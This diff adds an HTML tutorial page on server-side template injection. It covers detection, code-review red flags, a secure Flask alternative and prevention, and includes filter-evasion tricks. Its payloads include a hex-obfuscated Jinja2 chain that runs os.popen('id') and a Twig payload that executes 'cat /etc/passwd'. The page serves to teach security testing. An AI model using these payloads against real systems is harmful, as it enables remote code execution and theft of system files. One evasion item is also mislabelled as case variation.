@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎨 SSTI Fun House 🎨</title>
+    <style>
+        :root {
+            --primary: #FF6B6B;
+            --secondary: #4ECDC4;
+            --accent: #FFE66D;
+            --dark: #292F36;
+            --light: #F7FFF7;
+        }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&family=Fredoka+One&display=swap');
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Fira Code', monospace;
+
+        }
+        
+        body {
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+            background-image: radial-gradient(circle, #f0f8ff 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+        
+        header {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            border-bottom: 5px dashed var(--accent);
+            font-family: 'Fredoka One', cursive;
+        }
+        
+        h1, h2, h3 {
+            font-family: 'Fira Code', monospace;
+            margin-bottom: 1rem;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .vuln-card {
+            background-color: white;
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 8px 8px 0 var(--dark);
+            margin: 2rem 0;
+            border: 3px solid var(--dark);
+            transition: all 0.3s ease;
+        }
+        
+        .vuln-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 12px 12px 0 var(--dark);
+        }
+        
+        .vuln-card h2 {
+            color: var(--primary);
+            font-size: 2rem;
+            text-decoration: underline wavy var(--accent);
+        }
+        
+        .vuln-section {
+            margin-bottom: 2rem;
+            padding: 1rem;
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 10px;
+            border-left: 5px solid var(--secondary);
+        }
+        
+        .vuln-section h3 {
+            color: var(--secondary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .vuln-section h3:before {
+            content: "👉";
+            margin-right: 10px;
+        }
+        
+        ul, ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        li {
+            margin-bottom: 0.5rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+        
+        li:before {
+            content: "🤯";
+            position: absolute;
+            left: 0;
+        }
+        
+        pre {
+            background-color: var(--dark);
+            color: var(--light);
+            padding: 1rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            border: 3px solid var(--primary);
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+        
+        code {
+            font-family: 'Courier New', monospace;
+            background-color: var(--accent);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            color: var(--dark);
+            font-weight: bold;
+        }
+        
+        .danger {
+            color: var(--primary);
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        
+        .emoji-title {
+            font-size: 1.2em;
+            vertical-align: middle;
+        }
+        
+        .requirements {
+            background-color: #FFE66D;
+            padding: 1.5rem;
+            border-radius: 15px;
+            border: 3px dashed var(--primary);
+            margin: 2rem 0;
+        }
+        
+        .requirements h3 {
+            color: var(--primary);
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        
+        .requirements ul {
+            list-style-type: none;
+            margin-left: 0;
+        }
+        
+        .requirements li {
+            background-color: white;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-radius: 10px;
+            box-shadow: 3px 3px 0 var(--dark);
+            display: flex;
+            align-items: center;
+        }
+        
+        .requirements li:before {
+            content: "🔍";
+            margin-right: 10px;
+            font-size: 1.5rem;
+        }
+        
+        .filter-evasion {
+            background-color: #4ECDC4;
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin: 2rem 0;
+            color: white;
+        }
+        
+        .filter-evasion h3 {
+            color: white;
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 0 var(--dark);
+        }
+        
+        .filter-evasion ul {
+            list-style-type: none;
+            margin-left: 0;
+        }
+        
+        .filter-evasion li {
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-radius: 10px;
+            border: 2px solid white;
+        }
+        
+        .filter-evasion li:before {
+            content: "💣";
+        }
+        
+        .banner {
+            background-color: var(--accent);
+            padding: 1rem;
+            text-align: center;
+            border-radius: 50px;
+            margin: 2rem 0;
+            font-weight: bold;
+            font-size: 1.2rem;
+            border: 3px solid var(--dark);
+            transform: rotate(-2deg);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 2rem;
+            margin-top: 2rem;
+            background-color: var(--dark);
+            color: white;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <header class="pulse">
+        <h1>🎨 Welcome to the SSTI Fun House! 🎪</h1>
+        <p>Where we make Server-Side Template Injection fun and easy to understand!</p>
+    </header>
+
+    <div class="container">
+        <div class="banner">
+            🚨 SSTI stands for <span class="danger">Server-Side Template Injection</span> - it's like giving the server a script to run instead of just data! 🚨
+        </div>
+        
+        <div class="vuln-card">
+            <h2>🤔 What is SSTI?</h2>
+            <div class="vuln-section">
+                <p>SSTI happens when attackers can inject template code that gets executed on the server. It's like tricking the server into running your code when it thought it was just displaying information!</p>
+                <p>Imagine if you asked for a pizza 🍕 and instead got the whole pizza recipe book 📖 plus the chef's secret cooking skills 👨‍🍳!</p>
+            </div>
+            
+            <div class="requirements">
+                <h3>✨ Requirements for SSTI Exploitation ✨</h3>
+                <ul>
+                    <li><strong>User input is directly embedded into templates</strong> - The application must take user input and put it directly into a template</li>
+                    <li><strong>Template engine doesn't properly sandbox</strong> - The template engine must allow access to dangerous functions or objects</li>
+                    <li><strong>No input sanitization</strong> - The application doesn't properly filter or escape template syntax</li>
+                    <li><strong>Dangerous functions exposed</strong> - The template engine exposes functions that can lead to RCE (like file access or command execution)</li>
+                </ul>
+            </div>
+            
+            <div class="vuln-section">
+                <h3>🔍 How to Identify a Vulnerable Endpoint</h3>
+                <p>Here's how to spot SSTI vulnerabilities in the wild:</p>
+                <ul>
+                    <li>Test with basic math expressions: <code>{{7*7}}</code> (Jinja2) or <code>&lt;%= 7*7 %&gt;</code> (ERB)</li>
+                    <li>Try different template syntaxes for common engines</li>
+                    <li>Look for error messages that reveal the template engine</li>
+                    <li>Check if mathematical operations get evaluated (input <code>${7*7}</code> returns "49")</li>
+                    <li>Test parameter values that get reflected in the page</li>
+                    <li>Try common SSTI payloads for different template engines</li>
+                </ul>
+                <pre>
+// Example vulnerable URL
+https://example.com/profile?name={{7*7}}
+
+// If you see "Hello 49" instead of "Hello {{7*7}}", you've got SSTI!
+                </pre>
+            </div>
+            
+            <div class="vuln-section">
+                <h3>👨‍💻 How to Identify SSTI During Source Code Review</h3>
+                <p>When reviewing code, look for these red flags:</p>
+                <ul>
+                    <li><strong>Direct template string rendering</strong>:
+                        <pre>
+# Flask/Jinja2 vulnerable example
+from flask import render_template_string
+@app.route('/profile')
+def profile():
+    username = request.args.get('name')
+    return render_template_string(f"Hello {username}")  # Danger! 🚩
+                        </pre>
+                    </li>
+                    <li><strong>User input concatenated into templates</strong></li>
+                    <li><strong>Dangerous template functions</strong> like <code>render_template_string()</code> in Flask</li>
+                    <li><strong>Lack of context-aware autoescaping</strong></li>
+                    <li><strong>Custom template filters/functions</strong> that expose dangerous operations</li>
+                </ul>
+                <p>Secure alternative:</p>
+                <pre>
+# Secure Flask/Jinja2 example
+from flask import render_template
+@app.route('/profile')
+def profile():
+    username = request.args.get('name')
+    return render_template('profile.html', name=username)  # Safe ✅
+                </pre>
+            </div>
+            
+            <div class="filter-evasion">
+                <h3>💣 Awesome SSTI Filter Evasion Techniques 💣</h3>
+                <p>When the application tries to block your payloads, try these tricks:</p>
+                <ul>
+                    <li><strong>Case variation</strong>: <code>{{\x27\x27.__class__}}</code> instead of <code>{{''.__class__}}</code></li>
+                    <li><strong>Alternative attribute access</strong>: <code>{{''["__class__"]}}</code></li>
+                    <li><strong>String concatenation</strong>: <code>{{'__cl' + 'ass__'}}</code></li>
+                    <li><strong>Hex/octal encoding</strong>: <code>{{'\x5f\x5fclass\x5f\x5f'}}</code></li>
+                    <li><strong>Using built-in filters</strong>: <code>{{config|attr('\x5f\x5fclass\x5f\x5f')}}</code></li>
+                    <li><strong>Template comments</strong>: <code>{{"foo" # comment }}bar{{ comment # "baz" }}</code></li>
+                </ul>
+                
+                <h4 style="margin-top: 1.5rem; color: white;">🎯 Real-World Example Payloads:</h4>
+                <pre>
+# Jinja2 RCE bypassing filters
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# Twig filter evasion
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}
+                </pre>
+            </div>
+            
+            <div class="vuln-section">
+                <h3>🛡️ How to Prevent SSTI</h3>
+                <ul>
+                    <li><strong>Never</strong> use user input directly in templates</li>
+                    <li>Use context-aware autoescaping</li>
+                    <li>Sandbox template environments</li>
+                    <li>Use static templates with variables passed explicitly</li>
+                    <li>Disable dangerous template features</li>
+                    <li>Implement strict input validation</li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="banner">
+            🎉 Remember kids: With great SSTI power comes great responsibility! 🎉
+        </div>
+    </div>
+
+    <footer>
+        <p>Made with ❤️ and SSTI knowledge by Your Friendly Neighborhood Hacker</p>
+        <p>🚀 Hack responsibly and always get permission! 🚀</p>
+    </footer>
+</body>
+</html>
